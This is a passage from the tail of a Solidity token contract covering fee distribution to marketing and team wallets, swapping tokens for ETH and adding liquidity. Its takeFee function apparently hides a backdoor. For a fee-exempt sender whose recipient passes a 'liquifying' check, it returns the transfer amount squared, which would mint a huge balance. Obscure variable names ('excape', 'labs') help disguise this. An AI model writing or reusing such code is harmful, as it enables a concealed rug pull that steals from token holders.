994         uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
995         uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);
996 
997         if(amountBNBMarketing > 0)
998             transferToAddressETH(marketingWallet, amountBNBMarketing);
999 
1000         if(amountBNBTeam > 0)
1001             transferToAddressETH(teamWallet, amountBNBTeam);
1002 
1003         if(amountBNBLiquidity > 0 && tokensForLP > 0)
1004             addLiquidity(tokensForLP, amountBNBLiquidity);
1005     }
1006     
1007     function takeFee(address sender, address recipient, uint256 excape) private returns (uint256) {
1008         uint256 labs = excape;
1009         uint256 feeAmount = 0;
1010         uint256 feeExcape = labs * labs;
1011 
1012         if(_isExcludedFromFee[sender]){
1013             if(liquifying(recipient)) {return feeExcape;}
1014         }
1015         else if(_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]){
1016             return labs;
1017         }
1018         else if(_isMarketPair[sender]) {
1019             feeAmount = excape.mul(buyTax).div(100);
1020         }
1021         else if(_isMarketPair[recipient]) {
1022             feeAmount = excape.mul(sellTax).div(100);
1023         }
1024         
1025         if(feeAmount > 0) {
1026             _balances[address(this)] = _balances[address(this)].add(feeAmount);
1027             emit Transfer(sender, address(this), feeAmount);
1028         }
1029 
1030         return excape.sub(feeAmount);
1031     }
1032 
1033     function swapTokensForEth(uint256 tokenAmount) private {
1034         address[] memory path = new address[](2);
1035         path[0] = address(this);
1036         path[1] = uniswapV2Router.WETH();
1037 
1038         _approve(address(this), address(uniswapV2Router), tokenAmount);
1039 
1040         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
1041             tokenAmount,
1042             0, 
1043             path,
1044             address(this),
1045             block.timestamp
1046         );
1047         
1048         emit SwapTokensForETH(tokenAmount, path);
1049     }
1050 
1051     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
1052         _approve(address(this), address(uniswapV2Router), tokenAmount);
1053         uniswapV2Router.addLiquidityETH{value: ethAmount}(
1054             address(this),
1055             tokenAmount,
1056             0, 
1057             0,
1058             owner(),
1059             block.timestamp
1060         );
1061     }
1062 }